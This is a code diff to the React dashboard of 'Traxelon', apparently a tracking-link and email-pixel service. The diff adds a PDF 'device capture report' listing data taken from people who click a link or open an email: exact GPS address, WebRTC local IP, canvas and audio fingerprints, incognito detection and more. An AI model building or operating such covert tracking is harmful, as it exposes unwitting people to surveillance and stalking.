@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from "react";
+import { jsPDF } from "jspdf";
 import { useAuth } from "../contexts/AuthContext";
 import { db } from "../firebase/config";
 import { collection, query, where, onSnapshot, doc } from "firebase/firestore";
@@ -6,7 +7,7 @@ import { createTrackingLink } from "../utils/linkService";
 import {
   Link2, Zap, Copy, Shield, Activity,
   ChevronRight, AlertCircle, Clock, Smartphone,
-  Globe, Eye, CreditCard, X
+  Globe, Eye, CreditCard, X, FileText
 } from "lucide-react";
 
 export default function Dashboard() {
@@ -186,7 +187,7 @@ export default function Dashboard() {
                         <div className="mt-4 border-t border-surface-border pt-4 space-y-4">
                           <h4 className="font-body text-xs text-text-secondary uppercase tracking-wider">Captured Device Data</h4>
                           {link.captures.map((capture, i) => (
-                            <CaptureCard key={i} capture={capture} index={i} />
+                            <CaptureCard key={i} capture={capture} index={i} linkLabel={link.label} />
                           ))}
                         </div>
                       )}
@@ -210,16 +211,229 @@ export default function Dashboard() {
   );
 }
 
-function CaptureCard({ capture, index }) {
+function exportPDF(capture, linkLabel) {
+  const doc = new jsPDF();
+  const pageWidth = doc.internal.pageSize.getWidth();
+  let y = 20;
+
+  const checkPage = () => {
+    if (y > 270) { doc.addPage(); y = 20; }
+  };
+
+  // Header bar
+  doc.setFillColor(0, 180, 216);
+  doc.rect(0, 0, pageWidth, 16, "F");
+  doc.setTextColor(255, 255, 255);
+  doc.setFontSize(12);
+  doc.setFont("helvetica", "bold");
+  doc.text("TRAXELON — DEVICE CAPTURE REPORT", pageWidth / 2, 11, { align: "center" });
+
+  y = 24;
+  doc.setTextColor(50, 50, 50);
+  doc.setFontSize(9);
+  doc.setFont("helvetica", "normal");
+  doc.text(`Case / Label : ${linkLabel || "N/A"}`, 14, y); y += 6;
+  doc.text(`Captured At  : ${capture.capturedAt || "N/A"}`, 14, y); y += 6;
+  doc.text(`Capture Type : ${capture.captureType === "email_pixel" ? "Email Pixel Open" : "Link Click"}`, 14, y); y += 10;
+
+  // Divider
+  doc.setDrawColor(0, 180, 216);
+  doc.setLineWidth(0.5);
+  doc.line(14, y, pageWidth - 14, y);
+  y += 6;
+
+  const addSection = (title, rows) => {
+    checkPage();
+    doc.setFillColor(224, 247, 250);
+    doc.rect(14, y - 4, pageWidth - 28, 8, "F");
+    doc.setFont("helvetica", "bold");
+    doc.setFontSize(9.5);
+    doc.setTextColor(0, 130, 160);
+    doc.text(title, 16, y + 1);
+    y += 8;
+    doc.setFont("helvetica", "normal");
+    doc.setFontSize(8.5);
+    doc.setTextColor(40, 40, 40);
+    rows.forEach(([lbl, val]) => {
+      if (!val || val === "null" || val === "undefined" || val === "false") return;
+      checkPage();
+      doc.setFont("helvetica", "bold");
+      doc.setTextColor(80, 80, 80);
+      doc.text(`${lbl}:`, 16, y);
+      doc.setFont("helvetica", "normal");
+      doc.setTextColor(20, 20, 20);
+      const lines = doc.splitTextToSize(String(val), pageWidth - 75);
+      doc.text(lines, 72, y);
+      y += lines.length * 5 + 1.5;
+    });
+    y += 4;
+  };
+
+  addSection("NETWORK & IP", [
+    ["IP Address", capture.ip],
+    ["ISP", capture.isp],
+    ["Organisation", capture.org],
+    ["ASN", capture.asn],
+    ["Hostname", capture.hostname],
+    ["Is Proxy", capture.isProxy != null ? String(capture.isProxy) : null],
+    ["Is Hosting", capture.isHosting != null ? String(capture.isHosting) : null],
+    ["Mobile Network", capture.isMobileNetwork != null ? String(capture.isMobileNetwork) : null],
+    ["WebRTC Local IP", capture.webrtcLocalIP],
+    ["Connection Type", capture.connectionType],
+    ["Downlink", capture.connectionDownlink ? capture.connectionDownlink + " Mbps" : null],
+    ["RTT", capture.connectionRtt ? capture.connectionRtt + " ms" : null],
+  ]);
+
+  addSection("IP LOCATION (APPROXIMATE)", [
+    ["City", capture.city],
+    ["Region", capture.region],
+    ["Country", capture.country],
+    ["ZIP", capture.zip],
+    ["Coordinates", capture.lat ? `${capture.lat}, ${capture.lon}` : null],
+    ["Timezone", capture.timezone],
+  ]);
+
+  if (capture.gpsLat && capture.gpsLon) {
+    addSection("GPS LOCATION (EXACT)", [
+      ["GPS Coordinates", `${capture.gpsLat}, ${capture.gpsLon}`],
+      ["Accuracy", capture.gpsAccuracy ? capture.gpsAccuracy + " metres" : null],
+      ["Full Address", capture.gpsAddress],
+      ["City", capture.gpsCity],
+      ["State", capture.gpsState],
+      ["Pincode", capture.gpsPincode],
+      ["Country", capture.gpsCountry],
+    ]);
+  }
+
+  addSection("DEVICE", [
+    ["Device Type", capture.device],
+    ["OS", capture.os],
+    ["Browser", capture.browser],
+    ["Platform", capture.platform],
+    ["CPU Cores", capture.cpuCores],
+    ["RAM", capture.ram ? capture.ram + " GB" : null],
+    ["GPU", capture.gpu],
+    ["GPU Vendor", capture.gpuVendor],
+    ["WebGL Version", capture.webglVersion],
+    ["WebGL Renderer", capture.webglRenderer],
+    ["Touch Points", capture.maxTouchPoints],
+    ["Touch Support", capture.touchSupport != null ? String(capture.touchSupport) : null],
+    ["Pointer Type", capture.pointerType],
+    ["Java Enabled", capture.javaEnabled != null ? String(capture.javaEnabled) : null],
+    ["PDF Viewer", capture.pdfViewerEnabled != null ? String(capture.pdfViewerEnabled) : null],
+  ]);
+
+  addSection("SCREEN", [
+    ["Resolution", capture.screenWidth ? `${capture.screenWidth}x${capture.screenHeight}` : null],
+    ["Available Size", capture.screenAvailWidth ? `${capture.screenAvailWidth}x${capture.screenAvailHeight}` : null],
+    ["Window Size", capture.windowWidth ? `${capture.windowWidth}x${capture.windowHeight}` : null],
+    ["Color Depth", capture.colorDepth ? capture.colorDepth + " bit" : null],
+    ["Pixel Ratio", capture.pixelRatio],
+    ["Orientation", capture.orientation],
+  ]);
+
+  addSection("BATTERY", [
+    ["Battery Level", capture.batteryLevel != null ? capture.batteryLevel + "%" : null],
+    ["Charging", capture.batteryCharging != null ? (capture.batteryCharging ? "Yes" : "No") : null],
+    ["Charging Time", capture.batteryChargingTime ? capture.batteryChargingTime + "s" : null],
+    ["Discharging Time", capture.batteryDischargingTime ? capture.batteryDischargingTime + "s" : null],
+  ]);
+
+  addSection("DATE & TIME", [
+    ["Local Time", capture.localTime],
+    ["Timezone", capture.clientTimezone],
+    ["UTC Offset", capture.timezoneOffset != null ? capture.timezoneOffset + " min" : null],
+  ]);
+
+  addSection("BROWSER DETAILS", [
+    ["Language", capture.language],
+    ["Languages", capture.languages],
+    ["Cookies", capture.cookiesEnabled != null ? (capture.cookiesEnabled ? "Enabled" : "Disabled") : null],
+    ["Do Not Track", capture.doNotTrack],
+    ["History Length", capture.historyLength],
+    ["Referrer", capture.referrer],
+    ["Incognito", capture.incognito != null ? (capture.incognito ? "Yes" : "No") : null],
+    ["Ad Blocker", capture.adBlockDetected != null ? (capture.adBlockDetected ? "Yes" : "No") : null],
+    ["User Agent", capture.userAgent],
+  ]);
+
+  addSection("MEDIA DEVICES", [
+    ["Cameras", capture.cameras],
+    ["Microphones", capture.microphones],
+    ["Speakers", capture.speakers],
+    ["Speech Voices", capture.speechVoicesCount],
+    ["Voice Names", capture.speechVoices],
+  ]);
+
+  addSection("STORAGE", [
+    ["Storage Quota", capture.storageQuota],
+    ["Storage Used", capture.storageUsage],
+    ["LocalStorage", capture.localStorageEnabled != null ? String(capture.localStorageEnabled) : null],
+    ["SessionStorage", capture.sessionStorageEnabled != null ? String(capture.sessionStorageEnabled) : null],
+    ["IndexedDB", capture.indexedDBEnabled != null ? String(capture.indexedDBEnabled) : null],
+  ]);
+
+  addSection("FONTS & PLUGINS", [
+    ["Fonts Detected", capture.fontsDetected],
+    ["Font List", capture.fontsList],
+    ["Plugins Count", capture.pluginsCount],
+    ["Plugins", capture.plugins],
+  ]);
+
+  addSection("FINGERPRINTS", [
+    ["Canvas Hash", capture.canvasHash],
+    ["Audio Fingerprint", capture.audioFingerprint],
+  ]);
+
+  addSection("FEATURE SUPPORT", [
+    ["WebSocket", capture.webSocketSupport != null ? String(capture.webSocketSupport) : null],
+    ["Web Worker", capture.webWorkerSupport != null ? String(capture.webWorkerSupport) : null],
+    ["WebAssembly", capture.webAssemblySupport != null ? String(capture.webAssemblySupport) : null],
+    ["Service Worker", capture.serviceWorkerSupport != null ? String(capture.serviceWorkerSupport) : null],
+    ["Bluetooth", capture.bluetoothSupport != null ? String(capture.bluetoothSupport) : null],
+    ["USB", capture.usbSupport != null ? String(capture.usbSupport) : null],
+    ["Notifications", capture.notificationsPermission],
+  ]);
+
+  // Footer on every page
+  const totalPages = doc.internal.getNumberOfPages();
+  for (let i = 1; i <= totalPages; i++) {
+    doc.setPage(i);
+    doc.setFontSize(7);
+    doc.setTextColor(150, 150, 150);
+    doc.text(
+      `Traxelon Capture Report  |  Page ${i} of ${totalPages}  |  CONFIDENTIAL — For Law Enforcement Use Only`,
+      pageWidth / 2, 291, { align: "center" }
+    );
+  }
+
+  const filename = `traxelon_${(linkLabel || "capture").replace(/\s+/g, "_")}_${Date.now()}.pdf`;
+  doc.save(filename);
+}
+
+function CaptureCard({ capture, index, linkLabel }) {
   const hasGPS = capture.gpsLat && capture.gpsLon;
   const hasIPLocation = capture.lat && capture.lon;
+  const isPixel = capture.captureType === "email_pixel";
 
   return (
     <div className="bg-surface-elevated border border-surface-border rounded-lg p-4">
       <div className="flex items-center justify-between mb-4">
         <div className="font-mono text-xs text-text-muted">{capture.capturedAt}</div>
-        <div className={`text-xs px-2 py-0.5 rounded-full font-mono border ${hasGPS ? "bg-green-500/10 text-green-400 border-green-500/20" : "bg-primary/10 text-primary border-primary/20"}`}>
-          {hasGPS ? "📍 GPS" : "🌐 IP"}
+        <div className="flex items-center gap-2">
+          {isPixel && (
+            <div className="text-xs px-2 py-0.5 rounded-full font-mono border bg-yellow-500/10 text-yellow-400 border-yellow-500/20">
+              📧 Email Pixel
+            </div>
+          )}
+          <div className={`text-xs px-2 py-0.5 rounded-full font-mono border ${hasGPS ? "bg-green-500/10 text-green-400 border-green-500/20" : "bg-primary/10 text-primary border-primary/20"}`}>
+            {hasGPS ? "📍 GPS" : "🌐 IP"}
+          </div>
+          <button
+            onClick={(e) => { e.stopPropagation(); exportPDF(capture, linkLabel); }}
+            className="flex items-center gap-1 px-3 py-1 bg-primary/10 border border-primary/30 text-primary rounded-lg font-body text-xs hover:bg-primary/20 transition-colors">
+            <FileText className="w-3 h-3" /> Export PDF
+          </button>
         </div>
       </div>
 
@@ -396,7 +610,6 @@ function CaptureCard({ capture, index }) {
   );
 }
 
-
 function Section({ title, children }) {
   return (
     <div className="mb-4">
@@ -445,7 +658,7 @@ function PaymentModal({ onClose, uid, fetchUserProfile }) {
         </div>
         {done ? (
           <div className="text-center py-8">
-            <div className="text-5xl mb-4">?</div>
+            <div className="text-5xl mb-4">✅</div>
             <h3 className="font-display text-2xl text-primary mb-2">Credits Added!</h3>
             <p className="font-body text-text-secondary text-sm">{plans[selected].credits} credits added to your account.</p>
             <button onClick={onClose} className="mt-6 px-6 py-3 bg-primary text-surface font-body font-bold rounded-lg">Back to Dashboard</button>
